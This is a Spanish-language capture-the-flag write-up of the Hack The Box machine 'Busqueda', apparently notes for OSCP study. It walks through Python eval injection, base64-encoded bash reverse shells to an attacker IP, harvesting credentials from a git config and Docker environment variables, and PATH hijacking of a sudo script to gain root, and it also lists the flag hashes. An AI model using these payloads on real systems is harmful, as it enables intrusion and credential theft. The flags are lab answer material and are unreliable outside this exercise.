---
tags:
  - env/linux
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/537
dificultad: Fácil
ip: 10.10.11.208
os: Linux
linked:
  - "[[PATH Hijacking]]"
  - "[[Eval Injection]]"
  - "[[Password Reuse]]"
  - "[[searchor]]"
  - "[[.git Exposure]]"
  - "[[docker]]"
---
# HackTheBox - Busqueda

## Reconocimiento 

### Escaneo de Puertos con Nmap

Se realiza un escaneo de puertos TCP para identificar los servicios expuestos.
```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn <IP_MAQUINA>
```
    
**Resultado del escaneo:**
- **Puerto 22/tcp:** OpenSSH 8.2p1 (Servicio SSH)
- **Puerto 80/tcp:** Apache/2.4.41 (Servidor web HTTP)
    
A continuación, se realiza un escaneo más detallado sobre los puertos abiertos para obtener versiones y scripts por defecto.
```
nmap -p22,80 -sC -sV -oN targeted <IP_MAQUINA>
```

**Confirmación:**
- El puerto 80 corre un servidor Apache que, al acceder, redirige a un dominio: `searcher.htb`.    
- Se añade esta entrada al archivo `/etc/hosts` para poder resolver el dominio localmente.
```bash
# /etc/hosts
<IP_MAQUINA> searcher.htb
```

### Análisis de la Aplicación Web

- Al navegar a `http://searcher.htb`, se encuentra una aplicación simple con una barra de búsqueda. Al interceptar la petición con Burp Suite, se observa una cabecera interesante: `Server: Werkzeug/2.2.2 Python/3.8.10`.

> [!info] Observación clave
> `Werkzeug` es una librería WSGI para Python. Esto indica que el servidor Apache está actuando como un **proxy inverso** hacia una aplicación desarrollada en Python.

- El sitio es un motor de búsqueda unificado. Al seleccionar un motor (ej. GitHub) y un término de búsqueda, genera una URL. Si se marca "Auto redirect", redirige directamente.
- Las cabeceras HTTP y el pie de página confirman que la aplicación utiliza **Flask** y una librería llamada **Searchor**.


---

## Explotación de vulnerabilidades

### Fuzzing del Parámetro de Búsqueda

Se utiliza `ffuf` para realizar un fuzzing del parámetro `search` e identificar cómo la aplicación maneja caracteres especiales, buscando anomalías que puedan indicar una vulnerabilidad.

```bash
ffuf -request search.req -request-proto http -w /usr/share/seclists/Fuzzing/special-chars.txt
```

**Hallazgo:**
- Los payloads `"` (comilla doble), `'` (comilla simple) y `\` (barra invertida) devuelven una respuesta con **tamaño 0**. Esto es una fuerte indicación de que el backend está procesando estos caracteres de una manera no esperada, probablemente causando un error que es suprimido.

### Confirmación de la Inyección de Código (Eval Injection)

La hipótesis es que la entrada del usuario se está concatenando dentro de una cadena de texto en Python y luego es procesada por la función `eval()`.

**Prueba 1: Cerrar la cadena y causar un error sintáctico**
- **Payload:** `')`
- **Resultado:** La aplicación crashea o devuelve un error interno. Esto sugiere que el `)` se ejecutó fuera de una cadena, confirmando que `eval()` está en uso.
    
**Prueba 2: Concatenación de cadenas**
- **Payload:** `')+'1' # `
- **Resultado:** No hay error. La aplicación probablemente evaluó `'search_term' + '1'`, lo cual es sintácticamente válido.
    
**Prueba 3: Ejecución de código arbitrario**
Se intenta importar el módulo os y ejecutar un comando.
- **Payload:** `')+__import__('os').system('id') #`
- **Análisis del Payload:**
    - `')`: Cierra la cadena y la tupla de la sentencia `eval`.
    - `or`: Permite ejecutar la siguiente expresión si la anterior es falsa.
    - `__import__('os').system('id')`: Importa el módulo `os` y ejecuta el comando `id`.
    - `#`: Comenta el resto de la línea original para evitar errores de sintaxis.
        
- **Resultado:** La página muestra `uid=1001(svc) gid=1001(svc) groups=1001(svc)`. ¡Tenemos ejecución de comandos (RCE)!
    
### Obtención de Shell Inversa

Ahora que tenemos RCE, el siguiente paso es establecer una shell interactiva.

1. **Crear el payload de Reverse Shell en Bash:**
    ```bash
    bash -c 'bash -i >& /dev/tcp/<IP_ATACANTE>/443 0>&1'
    ```
    
2. **Codificar el payload en Base64:** Esto evita problemas con caracteres especiales al inyectarlo.
    ```bash
    echo "bash -c 'bash -i >& /dev/tcp/<IP_ATACANTE>/443 0>&1'" | base64
    # Resultado: YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTcvNDQzICAwPiYxJw==
    ```
    
3. **Preparar el listener en la máquina atacante:**    
    ```bash
    nc -lvnp 443
    ```
    
4. **Crear el payload final en Python para decodificar y ejecutar:**
```bash
    ')+__import__('os').system('echo -n YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTcvNDQzICAwPiYxJw== | base64 -d | bash') #
```
    
5. **Enviar el payload:** Se envía el payload a través del campo de búsqueda.

- **Resultado:** Se recibe una conexión en el listener de Netcat, obteniendo una shell como el usuario `svc`.


---

## Escalada de Privilegios

### Enumeración Interna
    
- **Análisis de `000-default.conf`:** Se inspecciona la configuración de Apache en `/etc/apache2/sites-available/000-default.conf`.
    
>[!note] **Hallazgo Clave** 
> Se descubre una segunda configuración de Proxy Inverso. Además de la aplicación `searcher`, hay un servicio `gitea` corriendo en el puerto 3000.
```Apache
ProxyPass / http://127.0.0.1:5000/
ProxyPassReverse / http://127.0.0.1:5000/

<Location /gitea>
	ProxyPass http://127.0.0.1:3000
	ProxyPassReverse http://127.0.0.1:3000
</Location>
```
    
- **Inspección del Repositorio Git:** En `/var/www/app` hay un repositorio `.git`
    ```bash
    cat .git/config
    ```
    
>[!danger] **Hallazgo Crítico** 
> Dentro de la configuración de `git`, se encuentra una URL remota con credenciales hardcodeadas.

```TOML
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
```
- **Usuario:** `cody`
- **Contraseña:** `jh1usoih2bkjaspwe92`
	
### Pivoting hacia Gitea y Docker

Intento usar las credenciales encontradas en el servicio Gitea (`http://gitea.searcher.htb`)
- **Login en Gitea:**
    - Pruebo `cody:jh1usoih2bkjaspwe92` -> **Éxito**.
    - Dentro de Gitea, veo que `cody` tiene un repositorio llamado `Searcher`.
    - En la sección de administración, veo a otro usuario: `administrator`.
    - Intento reutilizar la contraseña de `cody` para el usuario `administrator`, pero falla.
        
- **Enumeración con `sudo`:**
    ```bash
    sudo -l
    ```

>[!note] **Hallazgo Clave**
> La contraseña del gitea se puede reutilizar para el usuario `svc`

```bash
User svc may run the following commands on busqueda:
	(root) NOPASSWD: /usr/bin/python3 /opt/scripts/system-checkup.py *
```
El asterisco (`*`) indica que podemos pasar argumentos al script.

- **Explotación del Script system-checkup.py**:
    Al ejecutar el script con full-checkup se ven chequeos de Docker. La idea es usar el script para obtener información de los contenedores Docker que corren en la máquina.
    
- **Comando para inspeccionar un contenedor Docker:**
    ```bash
    sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{.json Config}}' 960873171e2e
    ```

- **Mejora visual del resutado:**
```bash
echo '{"Hostname":"960873171e2e","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"22/tcp":{},"3000/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","USER=git","GITEA_CUSTOM=/data/gitea"],"Cmd":["/bin/s6-svscan","/etc/s6"],"Image":"gitea/gitea:latest","Volumes":{"/data":{},"/etc/localtime":{},"/etc/timezone":{}},"WorkingDir":"","Entrypoint":["/usr/bin/entrypoint"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"server","com.docker.compose.version":"1.29.2","maintainer":"maintainers@gitea.io","org.opencontainers.image.created":"2022-11-24T13:22:00Z","org.opencontainers.image.revision":"9bccc60cf51f3b4070f5506b042a3d9a1442c73d","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"}}' | jq
```

>[!warning] **Hallazgo Crítico** 
>- Se extraen las variables de entorno del contenedor de Gitea, revelando la contraseña de la base de datos.
        
```JSON
#...
"GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
#...
```
- **Contraseña de la BBDD de Gitea:** `yuiu1hoiu4i5ho1uh`

### Análisis de vulnerabilidades (Gitea como administrador)

- **Entro a la web con la nueva credencial:** `administrator:yuiu1hoiu4i5ho1uh`

- **Análisis del script system-checkup.py como gitea**:
>[!BUG] **Vulnerabilidad**
>  Se encuentra una vulnerabilidad de **Path Hijacking**.
```Python
def full_checkup():
	# ...
	try:
		arg_list = ['./full-checkup.sh']
	# ...
```
    
La función `full_checkup` ejecuta el script `full-checkup.sh` **sin especificar una ruta absoluta**. Esto significa que el sistema buscará el script en los directorios listados en la variable de entorno `$PATH`.

### Escalada Final a Root (Path Hijacking)

1. **Elegir un directorio escribible:** El directorio `/dev/shm` es ideal porque es escribible por cualquier usuario.
	
2. **Crear el script malicioso `full-checkup.sh`:**
	```bash
	cd /dev/shm
	echo "bash -c 'bash -i >& /dev/tcp/10.10.14.11/443 0>&1'" > full-checkup.sh
	```
	
3. **Hacer el script ejecutable:**
	```bash
	chmod +x full-checkup.sh
	```
	
4. **Modificar la variable `$PATH`:** Se añade `/dev/shm` al principio de la variable `$PATH`, para que el sistema busque allí primero.
	```bash
	export PATH=/dev/shm:$PATH
	```
	
5. **Ejecutar el comando `sudo` vulnerable:**
	```bash
	sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
	```
	
- **Resultado:** El script de `sudo` ejecuta nuestro `full-checkup.sh` malicioso con privilegios de root, dándonos una shell de root.
```bash
# whoami
root
```

## Bandera(s)

> [!flag] `flag{user}`
> 34bd023015a91c94cd27e3d56e7a64b9
^bandera-user

> [!flag] `flag{root}`
> 9e7cd2d983130bf4d1db1d63276274e0
^bandera-root


